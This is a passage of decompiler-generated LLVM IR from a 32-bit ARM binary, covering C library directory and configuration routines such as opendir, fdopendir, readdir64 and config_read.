  %v2_13ca0 = add i32 %v1_13ca0, 12
  %v3_13ca0 = inttoptr i32 %v2_13ca0 to i32*
  store i32 %v2_13c94, i32* %v3_13ca0, align 4
  br i1 %v2_13c98, label %dec_label_pc_13ca8, label %dec_label_pc_13cb8

dec_label_pc_13ca8:                               ; preds = %bb17
  %v0_13ca8 = load i32, i32* @r5, align 4
  store i32 %v0_13ca8, i32* @r0, align 4
  %v0_13cac = call i32 @free()
  %v0_13cb0 = load i32, i32* @r4, align 4
  br label %dec_label_pc_13cf0

dec_label_pc_13cb8:                               ; preds = %bb17
  %v0_13cbc = load i32, i32* @r6, align 4
  %v2_13cbc = add i32 %v0_13cbc, -33160
  store i32 %v2_13cbc, i32* %r3.global-to-local, align 4
  %v1_13cc4 = inttoptr i32 %v2_13cbc to i32*
  %v2_13cc4 = load i32, i32* %v1_13cc4, align 4
  %v3_13cc4 = add i32 %v0_13cbc, -33156
  %v4_13cc4 = inttoptr i32 %v3_13cc4 to i32*
  %v5_13cc4 = load i32, i32* %v4_13cc4, align 4
  store i32 %v5_13cc4, i32* %r1.global-to-local, align 4
  %v6_13cc4 = add i32 %v0_13cbc, -33152
  %v7_13cc4 = inttoptr i32 %v6_13cc4 to i32*
  %v8_13cc4 = load i32, i32* %v7_13cc4, align 4
  store i32 %v8_13cc4, i32* %r2.global-to-local, align 4
  %v9_13cc4 = add i32 %v0_13cbc, -33148
  %v10_13cc4 = inttoptr i32 %v9_13cc4 to i32*
  %v11_13cc4 = load i32, i32* %v10_13cc4, align 4
  store i32 %v11_13cc4, i32* %r3.global-to-local, align 4
  %v12_13cc4 = add i32 %v0_13cbc, -33144
  %v1_13cd0 = inttoptr i32 %v12_13cc4 to i32*
  %v2_13cd0 = load i32, i32* %v1_13cd0, align 4
  %v3_13cd0 = add i32 %v0_13cbc, -33140
  %v4_13cd0 = inttoptr i32 %v3_13cd0 to i32*
  %v5_13cd0 = load i32, i32* %v4_13cd0, align 4
  store i32 %v2_13cd0, i32* %stack_var_-32, align 4
  store i32 %v5_13cc4, i32* %r1.global-to-local, align 4
  store i32 %v8_13cc4, i32* %r2.global-to-local, align 4
  store i32 %v11_13cc4, i32* %r3.global-to-local, align 4
  %v0_13ce0 = load i32, i32* @r5, align 4
  %v1_13ce0 = add i32 %v0_13ce0, 24
  %v1_13ce4 = inttoptr i32 %v1_13ce0 to i32*
  store i32 %v2_13cc4, i32* %v1_13ce4, align 4
  %v3_13ce4 = add i32 %v0_13ce0, 28
  %v4_13ce4 = inttoptr i32 %v3_13ce4 to i32*
  %v5_13ce4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_13ce4, i32* %v4_13ce4, align 4
  %v6_13ce4 = add i32 %v0_13ce0, 32
  %v7_13ce4 = inttoptr i32 %v6_13ce4 to i32*
  %v8_13ce4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_13ce4, i32* %v7_13ce4, align 4
  %v9_13ce4 = add i32 %v0_13ce0, 36
  %v10_13ce4 = inttoptr i32 %v9_13ce4 to i32*
  %v11_13ce4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_13ce4, i32* %v10_13ce4, align 4
  %v12_13ce4 = add i32 %v0_13ce0, 40
  %v2_13ce8 = load i32, i32* %stack_var_-32, align 4
  store i32 %v5_13cd0, i32* %r1.global-to-local, align 4
  %v1_13cec = inttoptr i32 %v12_13ce4 to i32*
  store i32 %v2_13ce8, i32* %v1_13cec, align 4
  %v3_13cec = add i32 %v0_13ce0, 44
  %v4_13cec = inttoptr i32 %v3_13cec to i32*
  %v5_13cec = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_13cec, i32* %v4_13cec, align 4
  %v0_13cf0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13cf0

dec_label_pc_13cf0:                               ; preds = %bb, %dec_label_pc_13ca8, %dec_label_pc_13cb8
  %v0_13cf0 = phi i32 [ 0, %bb ], [ %v0_13cb0, %dec_label_pc_13ca8 ], [ %v0_13cf0.pre, %dec_label_pc_13cb8 ]
  store i32 %v12_13c38, i32* @r7, align 4
  ret i32 %v0_13cf0

; uselistorder directives
  uselistorder i32 %v2_13c94, { 1, 0, 2 }
  uselistorder i32 %v0_13c4c, { 2, 1, 6, 0, 5, 4, 3, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 512, { 5, 2, 6, 3, 7, 4, 8, 0, 9, 1, 10 }
  uselistorder label %dec_label_pc_13cf0, { 2, 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__GI_opendir(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-96 = alloca i32, align 4
  store i32 542720, i32* %r1.global-to-local, align 4
  %v2_13d10 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp6 = icmp ult i32 %arg1, -4095
  br i1 %tmp6, label %dec_label_pc_13d40, label %dec_label_pc_13d28

dec_label_pc_13d28:                               ; preds = %entry
  %v0_13d2c = call i32 @__aeabi_read_tp()
  %v3_13d30 = load i16, i16* @global_var_20d4c.598, align 2
  %v4_13d30 = sext i16 %v3_13d30 to i32
  %v0_13d34 = load i32, i32* %r2.global-to-local, align 4
  %v1_13d34 = sub i32 0, %v0_13d34
  store i32 %v1_13d34, i32* %r2.global-to-local, align 4
  %v3_13d38 = add i32 %v4_13d30, %v0_13d2c
  %v4_13d38 = inttoptr i32 %v3_13d38 to i32*
  store i32 %v1_13d34, i32* %v4_13d38, align 4
  br label %dec_label_pc_13d64

dec_label_pc_13d40:                               ; preds = %entry
  store i32 %arg1, i32* @r7, align 4
  %v1_13d40 = icmp slt i32 %arg1, 0
  br i1 %v1_13d40, label %dec_label_pc_13d64, label %dec_label_pc_13d48

dec_label_pc_13d48:                               ; preds = %dec_label_pc_13d40
  store i32 %v2_13d10, i32* @r1, align 4
  %v0_13d4c = call i32 @fstat()
  %v1_13d50 = icmp slt i32 %v0_13d4c, 0
  br i1 %v1_13d50, label %dec_label_pc_13d58, label %dec_label_pc_13d6c

dec_label_pc_13d58:                               ; preds = %dec_label_pc_13d48
  br label %dec_label_pc_13d64

dec_label_pc_13d64:                               ; preds = %dec_label_pc_13d58, %dec_label_pc_13d40, %dec_label_pc_13d28
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13db0

dec_label_pc_13d6c:                               ; preds = %dec_label_pc_13d48
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_13d74 = load i32, i32* @r7, align 4
  %v3_13d78 = call i32 @__GI___fcntl_nocancel(i32 %v0_13d74, i32 2, i32 1)
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_13d80 = load i32, i32* @r7, align 4
  %v2_13d84 = call i32 @fd_to_DIR(i32 %v0_13d80, i32 %tmp)
  store i32 %v2_13d84, i32* %r1.global-to-local, align 4
  %v2_13d88 = icmp eq i32 %v2_13d84, 0
  br i1 %v2_13d88, label %dec_label_pc_13d90, label %dec_label_pc_13db0

dec_label_pc_13d90:                               ; preds = %dec_label_pc_13d6c
  %v0_13da0 = call i32 @__aeabi_read_tp()
  %v3_13da4 = load i16, i16* @global_var_20d4c.598, align 2
  %v4_13da4 = sext i16 %v3_13da4 to i32
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_13dac = add i32 %v4_13da4, %v0_13da0
  %v4_13dac = inttoptr i32 %v3_13dac to i32*
  store i32 12, i32* %v4_13dac, align 4
  %v0_13db0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13db0

dec_label_pc_13db0:                               ; preds = %dec_label_pc_13d6c, %dec_label_pc_13d64, %dec_label_pc_13d90
  %v0_13db0 = phi i32 [ %v2_13d84, %dec_label_pc_13d6c ], [ 0, %dec_label_pc_13d64 ], [ %v0_13db0.pre, %dec_label_pc_13d90 ]
  ret i32 %v0_13db0

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_13db0, { 2, 0, 1 }
}

define i32 @"$d"(i32 %arg1) local_unnamed_addr {
dec_label_pc_13dc0:
  %v0_13dc0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13dc0, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_13dc0
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_13dc0, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @fdopendir(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v2_13dd0 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_13dd0, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_13ddc = call i32 @fstat()
  store i32 %v0_13ddc, i32* @r5, align 4
  %v2_13de0 = icmp eq i32 %v0_13ddc, 0
  br i1 %v2_13de0, label %dec_label_pc_13de8, label %dec_label_pc_13e60

dec_label_pc_13de8:                               ; preds = %entry
  %v1_13dec = and i32 %tmp4, 61440
  store i32 %v1_13dec, i32* @r3, align 4
  %v7_13df0 = icmp eq i32 %v1_13dec, 16384
  br i1 %v7_13df0, label %dec_label_pc_13e10, label %dec_label_pc_13df8

dec_label_pc_13df8:                               ; preds = %dec_label_pc_13de8
  %v0_13dfc = call i32 @__aeabi_read_tp()
  %v3_13e00 = load i16, i16* @global_var_20d4c.598, align 2
  %v0_13e04 = load i32, i32* @r5, align 4
  store i32 %v0_13e04, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13e44

dec_label_pc_13e10:                               ; preds = %dec_label_pc_13de8
  %v0_13e10 = load i32, i32* @r4, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_13e18 = call i32 @__libc_fcntl(i32 %v0_13e10, i32 3)
  %v7_13e1c = icmp eq i32 %v2_13e18, -1
  br i1 %v7_13e1c, label %dec_label_pc_13e60, label %dec_label_pc_13e24

dec_label_pc_13e24:                               ; preds = %dec_label_pc_13e10
  %v1_13e24 = urem i32 %v2_13e18, 4
  store i32 %v1_13e24, i32* %r3.global-to-local, align 4
  %v7_13e28 = icmp eq i32 %v1_13e24, 1
  br i1 %v7_13e28, label %dec_label_pc_13e30, label %dec_label_pc_13e4c

dec_label_pc_13e30:                               ; preds = %dec_label_pc_13e24
  %v0_13e34 = call i32 @__aeabi_read_tp()
  %v3_13e38 = load i16, i16* @global_var_20d4c.598, align 2
  %v0_13e3c = load i32, i32* @r5, align 4
  store i32 %v0_13e3c, i32* %r1.global-to-local, align 4
  %v0_13e40 = load i32, i32* %r3.global-to-local, align 4
  %v1_13e40 = add i32 %v0_13e40, 21
  br label %dec_label_pc_13e44

dec_label_pc_13e44:                               ; preds = %dec_label_pc_13df8, %dec_label_pc_13e30
  %v2_13e44.in = phi i16 [ %v3_13e00, %dec_label_pc_13df8 ], [ %v3_13e38, %dec_label_pc_13e30 ]
  %v1_13e44 = phi i32 [ %v0_13dfc, %dec_label_pc_13df8 ], [ %v0_13e34, %dec_label_pc_13e30 ]
  %storemerge = phi i32 [ 20, %dec_label_pc_13df8 ], [ %v1_13e40, %dec_label_pc_13e30 ]
  %v2_13e44 = sext i16 %v2_13e44.in to i32
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v3_13e44 = add i32 %v1_13e44, %v2_13e44
  %v4_13e44 = inttoptr i32 %v3_13e44 to i32*
  store i32 %storemerge, i32* %v4_13e44, align 4
  %v0_13e64.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13e64

dec_label_pc_13e4c:                               ; preds = %dec_label_pc_13e24
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_13e50 = load i32, i32* @r4, align 4
  %v2_13e54 = call i32 @fd_to_DIR(i32 %v0_13e50, i32 %tmp)
  store i32 %v2_13e54, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13e64

dec_label_pc_13e60:                               ; preds = %entry, %dec_label_pc_13e10
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13e64

dec_label_pc_13e64:                               ; preds = %dec_label_pc_13e4c, %dec_label_pc_13e44, %dec_label_pc_13e60
  %v0_13e64 = phi i32 [ %v2_13e54, %dec_label_pc_13e4c ], [ %v0_13e64.pre, %dec_label_pc_13e44 ], [ 0, %dec_label_pc_13e60 ]
  ret i32 %v0_13e64

; uselistorder directives
  uselistorder i32 %v1_13e24, { 1, 0 }
  uselistorder i32 %v2_13e18, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 5, 3, 4, 6 }
  uselistorder i32 21, { 2, 0, 3, 4, 5, 1 }
  uselistorder label %dec_label_pc_13e64, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13e60, { 1, 0 }
  uselistorder label %dec_label_pc_13e44, { 1, 0 }
}

define i32 @readdir64(i32* %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* @r6, align 4
  %v1_13e90 = add i32 %tmp, 24
  store i32 %v1_13e90, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_13ea8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 112) to i32*), align 4
  store i32 %v4_13ea8, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13ea8)
  %v0_13ebc = load i32, i32* @r6, align 4
  %v2_13ebc = add i32 %v0_13ebc, 16
  %v3_13ebc = inttoptr i32 %v2_13ebc to i32*
  %v4_13ebc = load i32, i32* %v3_13ebc, align 4
  store i32 %v4_13ebc, i32* %ip.global-to-local, align 4
  store i32 81608, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13ebc)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_13ecc

dec_label_pc_13ecc:                               ; preds = %dec_label_pc_13efc, %entry
  %v0_13ecc = load i32, i32* @r5, align 4
  %v1_13ecc = add i32 %v0_13ecc, 4
  %v2_13ecc = inttoptr i32 %v1_13ecc to i32*
  %v3_13ecc = load i32, i32* %v2_13ecc, align 4
  %v4_13ecc = add i32 %v0_13ecc, 8
  %v5_13ecc = inttoptr i32 %v4_13ecc to i32*
  %v6_13ecc = load i32, i32* %v5_13ecc, align 4
  %tmp10 = icmp ugt i32 %v6_13ecc, %v3_13ecc
  br i1 %tmp10, label %dec_label_pc_13efc, label %dec_label_pc_13ed8

dec_label_pc_13ed8:                               ; preds = %dec_label_pc_13ecc
  %v1_13ed8 = inttoptr i32 %v0_13ecc to i32*
  %v2_13ed8 = load i32, i32* %v1_13ed8, align 4
  %v1_13edc = add i32 %v0_13ecc, 12
  %v2_13edc = inttoptr i32 %v1_13edc to i32*
  %v3_13edc = load i32, i32* %v2_13edc, align 4
  %v1_13ee0 = add i32 %v0_13ecc, 20
  %v2_13ee0 = inttoptr i32 %v1_13ee0 to i32*
  %v3_13ee0 = load i32, i32* %v2_13ee0, align 4
  %v4_13ee4 = inttoptr i32 %v3_13edc to i32*
  %v5_13ee4 = call i32 @__getdents64(i32 %v2_13ed8, i32* %v4_13ee4, i32 %v3_13ee0, i32 %v6_13ecc)
  %tmp9 = icmp slt i32 %v5_13ee4, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_13ef4

.thread:                                          ; preds = %dec_label_pc_13ed8
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_13f2c

dec_label_pc_13ef4:                               ; preds = %dec_label_pc_13ed8
  %v1_13ef4 = load i32, i32* @r5, align 4
  %v2_13ef4 = add i32 %v1_13ef4, 8
  %v3_13ef4 = inttoptr i32 %v2_13ef4 to i32*
  store i32 %v5_13ee4, i32* %v3_13ef4, align 4
  %v0_13ef8 = load i32, i32* @r7, align 4
  %v1_13ef8 = load i32, i32* @r5, align 4
  %v2_13ef8 = add i32 %v1_13ef8, 4
  %v3_13ef8 = inttoptr i32 %v2_13ef8 to i32*
  store i32 %v0_13ef8, i32* %v3_13ef8, align 4
  %v0_13efc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13efc

dec_label_pc_13efc:                               ; preds = %dec_label_pc_13ecc, %dec_label_pc_13ef4
  %v1_13f20 = phi i32 [ %v0_13ecc, %dec_label_pc_13ecc ], [ %v0_13efc.pre, %dec_label_pc_13ef4 ]
  %v1_13efc = add i32 %v1_13f20, 4
  %v2_13efc = inttoptr i32 %v1_13efc to i32*
  %v3_13efc = load i32, i32* %v2_13efc, align 4
  %v1_13f00 = add i32 %v1_13f20, 12
  %v2_13f00 = inttoptr i32 %v1_13f00 to i32*
  %v3_13f00 = load i32, i32* %v2_13f00, align 4
  %v2_13f04 = add i32 %v3_13f00, %v3_13efc
  store i32 %v2_13f04, i32* @r4, align 4
  %v3_13f08 = inttoptr i32 %v2_13f04 to i32*
  %v4_13f08 = load i32, i32* %v3_13f08, align 4
  %v1_13f0c = add i32 %v2_13f04, 4
  %v2_13f0c = inttoptr i32 %v1_13f0c to i32*
  %v3_13f0c = load i32, i32* %v2_13f0c, align 4
  %v1_13f10 = add i32 %v2_13f04, 16
  %v2_13f10 = inttoptr i32 %v1_13f10 to i16*
  %v3_13f10 = load i16, i16* %v2_13f10, align 2
  %v4_13f10 = zext i16 %v3_13f10 to i32
  %v1_13f14 = add i32 %v2_13f04, 8
  %v2_13f14 = inttoptr i32 %v1_13f14 to i32*
  %v3_13f14 = load i32, i32* %v2_13f14, align 4
  store i32 %v3_13f14, i32* %ip.global-to-local, align 4
  %v2_13f18 = add i32 %v4_13f10, %v3_13efc
  %v2_13f1c = or i32 %v3_13f0c, %v4_13f08
  %v4_13f1c = icmp eq i32 %v2_13f1c, 0
  store i32 %v2_13f18, i32* %v2_13efc, align 4
  %v0_13f24 = load i32, i32* %ip.global-to-local, align 4
  %v1_13f24 = load i32, i32* @r5, align 4
  %v2_13f24 = add i32 %v1_13f24, 16
  %v3_13f24 = inttoptr i32 %v2_13f24 to i32*
  store i32 %v0_13f24, i32* %v3_13f24, align 4
  br i1 %v4_13f1c, label %dec_label_pc_13ecc, label %dec_label_pc_13f2c

dec_label_pc_13f2c:                               ; preds = %dec_label_pc_13efc, %.thread
  %v0_13f38 = load i32, i32* @r6, align 4
  %v2_13f38 = add i32 %v0_13f38, 44
  %v3_13f38 = inttoptr i32 %v2_13f38 to i32*
  %v4_13f38 = load i32, i32* %v3_13f38, align 4
  store i32 %v4_13f38, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13f38)
  %v0_13f44 = load i32, i32* @r4, align 4
  ret i32 %v0_13f44

; uselistorder directives
  uselistorder i32 %v2_13f04, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_13f20, { 1, 0 }
  uselistorder i32 %v6_13ecc, { 1, 0 }
  uselistorder i32 %v0_13ecc, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 112, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_13efc, { 1, 0 }
}

define i32 @function_13f58(i32 %arg1) local_unnamed_addr {
dec_label_pc_13f58:
  %v0_13f58 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13f58, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_13f58
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_13f58, %bb
  %v4_13f64 = phi i32 [ %arg1, %dec_label_pc_13f58 ], [ 0, %bb ]
  ret i32 %v4_13f64

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI_config_read(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_13f68 = load i32, i32* @r4, align 4
  %v6_13f68 = load i32, i32* @r5, align 4
  %v9_13f68 = load i32, i32* @r6, align 4
  %v12_13f68 = load i32, i32* @r7, align 4
  %v15_13f68 = load i32, i32* @r8, align 4
  %v18_13f68 = load i32, i32* @sb, align 4
  %v21_13f68 = load i32, i32* @sl, align 4
  %v24_13f68 = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_13f6c = icmp eq i32* %arg1, null
  store i1 %v2_13f6c, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_13f6c, label %dec_label_pc_1427c, label %dec_label_pc_13f84

dec_label_pc_13f84:                               ; preds = %entry
  %v1_13f84 = urem i32 %arg3, 256
  store i32 %v1_13f84, i32* @sb, align 4
  %v1_13f88 = udiv i32 %arg3, 256
  %v3_13f8c = urem i32 %v1_13f88, 256
  %v3_13f90 = mul nuw nsw i32 %v1_13f84, 4
  %v1_13f98 = or i32 %v3_13f90, 1
  %v1_13fa4 = and i32 %arg3, 131072
  %v1_13fa8 = add nsw i32 %v1_13f84, -1
  %v1_13fb4 = and i32 %arg3, 262144
  store i32 %v1_13fb4, i32* %r2.global-to-local, align 4
  %v1_13fb8 = and i32 %arg3, 65536
  store i32 %v1_13fb8, i32* %r3.global-to-local, align 4
  store i32 %v1_13fb8, i32* %stack_var_-72, align 4
  store i32 0, i32* @fp, align 4
  %v1_13fc8 = add i32 %arg4, 1
  store i32 %v1_13fc8, i32* @sl, align 4
  %v2_14140 = icmp eq i32 %v1_13fa4, 0
  %v1_14198 = inttoptr i32 %arg2 to i32*
  %v2_141b0 = icmp eq i32 %v1_13fb4, 0
  br label %dec_label_pc_13fcc

dec_label_pc_13fcc:                               ; preds = %dec_label_pc_13fcc.backedge, %dec_label_pc_13f84
  %v2_13fe8 = phi i32 [ %v0_13fcc.pre, %dec_label_pc_13fcc.backedge ], [ %tmp, %dec_label_pc_13f84 ]
  %v1_13fcc = add i32 %v2_13fe8, 4
  %v2_13fcc = inttoptr i32 %v1_13fcc to i32*
  %v3_13fcc = load i32, i32* %v2_13fcc, align 4
  store i32 %v3_13fcc, i32* %r3.global-to-local, align 4
  %v2_13fd0 = icmp eq i32 %v3_13fcc, 0
  store i1 %v2_13fd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13fd0, label %dec_label_pc_13fd8, label %dec_label_pc_14020

dec_label_pc_13fd8:                               ; preds = %dec_label_pc_13fcc
  %v1_13fd8 = add i32 %v2_13fe8, 16
  %v2_13fd8 = inttoptr i32 %v1_13fd8 to i32*
  %v3_13fd8 = load i32, i32* %v2_13fd8, align 4
  store i32 %v3_13fd8, i32* %r3.global-to-local, align 4
  %v2_13fdc = icmp eq i32 %v3_13fd8, 0
  store i1 %v2_13fdc, i1* %cpsr_z.global-to-local, align 1
  %v1_13fe0 = add i32 %v2_13fe8, 8
  %v2_13fe0 = inttoptr i32 %v1_13fe0 to i32*
  %v3_13fe0 = load i32, i32* %v2_13fe0, align 4
  store i32 %v3_13fe0, i32* %r3.global-to-local, align 4
  br i1 %v2_13fdc, label %bb, label %bb64

bb:                                               ; preds = %dec_label_pc_13fd8
  store i32 81, i32* %r2.global-to-local, align 4
  store i32 81, i32* %v2_13fd8, align 4
  %v0_13fec.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_13fd8, %bb
  %v0_13fec = phi i32 [ %v0_13fec.pre, %bb ], [ %v3_13fe0, %dec_label_pc_13fd8 ]
  %v2_13fec = icmp eq i32 %v0_13fec, 0
  store i1 %v2_13fec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13fec, label %bb65, label %.thread

bb65:                                             ; preds = %bb64
  store i32 %v1_13f98, i32* %r3.global-to-local, align 4
  %v2_13ff4 = load i32, i32* @r5, align 4
  %v3_13ff4 = add i32 %v2_13ff4, 8
  %v4_13ff4 = inttoptr i32 %v3_13ff4 to i32*
  store i32 %v1_13f98, i32* %v4_13ff4, align 4
  br label %.thread

.thread:                                          ; preds = %bb64, %bb65
  %v0_13ff8 = load i32, i32* @r5, align 4
  %v1_13ff8 = add i32 %v0_13ff8, 16
  %v2_13ff8 = inttoptr i32 %v1_13ff8 to i32*
  %v3_13ff8 = load i32, i32* %v2_13ff8, align 4
  store i32 %v3_13ff8, i32* %r0.global-to-local, align 4
  %v1_13ffc = add i32 %v0_13ff8, 8
  %v2_13ffc = inttoptr i32 %v1_13ffc to i32*
  %v3_13ffc = load i32, i32* %v2_13ffc, align 4
  store i32 %v3_13ffc, i32* %r3.global-to-local, align 4
  %v2_14000 = add i32 %v3_13ffc, %v3_13ff8
  store i32 %v2_14000, i32* @r0, align 4
  %v0_14004 = call i32 @malloc()
  store i32 %v0_14004, i32* %r0.global-to-local, align 4
  %v2_14008 = icmp eq i32 %v0_14004, 0
  store i1 %v2_14008, i1* %cpsr_z.global-to-local, align 1
  %v1_1400c = load i32, i32* @r5, align 4
  %v2_1400c = add i32 %v1_1400c, 4
  %v3_1400c = inttoptr i32 %v2_1400c to i32*
  store i32 %v0_14004, i32* %v3_1400c, align 4
  br i1 %v2_14008, label %dec_label_pc_1427c, label %dec_label_pc_14014

dec_label_pc_14014:                               ; preds = %.thread
  %v0_14014 = load i32, i32* @r5, align 4
  %v1_14014 = add i32 %v0_14014, 20
  %v2_14014 = inttoptr i32 %v1_14014 to i32*
  %v3_14014 = load i32, i32* %v2_14014, align 4
  %v1_14018 = or i32 %v3_14014, 1
  store i32 %v1_14018, i32* %r3.global-to-local, align 4
  store i32 %v1_14018, i32* %v2_14014, align 4
  %v0_14020.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14020

dec_label_pc_14020:                               ; preds = %dec_label_pc_13fcc, %dec_label_pc_14014
  %v1_14028 = phi i32 [ %v2_13fe8, %dec_label_pc_13fcc ], [ %v0_14020.pre, %dec_label_pc_14014 ]
  %v1_14020 = add i32 %v1_14028, 4
  %v2_14020 = inttoptr i32 %v1_14020 to i32*
  %v3_14020 = load i32, i32* %v2_14020, align 4
  store i32 %v3_14020, i32* %r2.global-to-local, align 4
  %v4_14020 = add i32 %v1_14028, 8
  %v5_14020 = inttoptr i32 %v4_14020 to i32*
  %v6_14020 = load i32, i32* %v5_14020, align 4
  %v2_14024 = add i32 %v6_14020, %v3_14020
  store i32 %v2_14024, i32* %r3.global-to-local, align 4
  %v2_14028 = add i32 %v1_14028, 12
  %v3_14028 = inttoptr i32 %v2_14028 to i32*
  store i32 %v2_14024, i32* %v3_14028, align 4
  %v0_1402c = load i32, i32* @fp, align 4
  store i32 %v0_1402c, i32* @r6, align 4
  br label %dec_label_pc_14030

dec_label_pc_14030:                               ; preds = %dec_label_pc_140bc, %dec_label_pc_140a8, %dec_label_pc_14020
  %v0_14038 = phi i32 [ %v0_1402c, %dec_label_pc_14020 ], [ %v1_140a8, %dec_label_pc_140a8 ], [ %v0_14038.pre.pre, %dec_label_pc_140bc ]
  %v0_14030 = load i32, i32* @r5, align 4
  %v1_14030 = add i32 %v0_14030, 12
  store i32 %v1_14030, i32* %r0.global-to-local, align 4
  %v1_14034 = inttoptr i32 %v1_14030 to i32*
  %v2_14034 = load i32, i32* %v1_14034, align 4
  store i32 %v2_14034, i32* %r0.global-to-local, align 4
  %v3_14034 = add i32 %v0_14030, 16
  %v4_14034 = inttoptr i32 %v3_14034 to i32*
  %v5_14034 = load i32, i32* %v4_14034, align 4
  %v2_14038 = add i32 %v2_14034, %v0_14038
  store i32 %v2_14038, i32* %r0.global-to-local, align 4
  %v2_1403c = sub i32 %v5_14034, %v0_14038
  %v1_14040 = inttoptr i32 %v0_14030 to i32*
  %v2_14040 = load i32, i32* %v1_14040, align 4
  store i32 %v2_14040, i32* %r2.global-to-local, align 4
  %v3_14044 = call i32 @fgets(i32 %v2_14038, i32 %v2_1403c, i32 %v2_14040)
  store i32 %v3_14044, i32* %r0.global-to-local, align 4
  store i32 %v3_14044, i32* %r4.global-to-local, align 4
  %v2_14048 = icmp eq i32 %v3_14044, 0
  store i1 %v2_14048, i1* %cpsr_z.global-to-local, align 1
  %v0_14050 = load i32, i32* @r5, align 4
  %v1_14050 = add i32 %v0_14050, 12
  br i1 %v2_14048, label %dec_label_pc_14050, label %dec_label_pc_14068

dec_label_pc_14050:                               ; preds = %dec_label_pc_14030
  store i32 %v1_14050, i32* %r0.global-to-local, align 4
  %v1_14054 = inttoptr i32 %v1_14050 to i32*
  %v2_14054 = load i32, i32* %v1_14054, align 4
  store i32 %v2_14054, i32* %r0.global-to-local, align 4
  %v3_14054 = add i32 %v0_14050, 16
  %v4_14054 = inttoptr i32 %v3_14054 to i32*
  %v5_14054 = load i32, i32* %v4_14054, align 4
  store i32 %v5_14054, i32* %r2.global-to-local, align 4
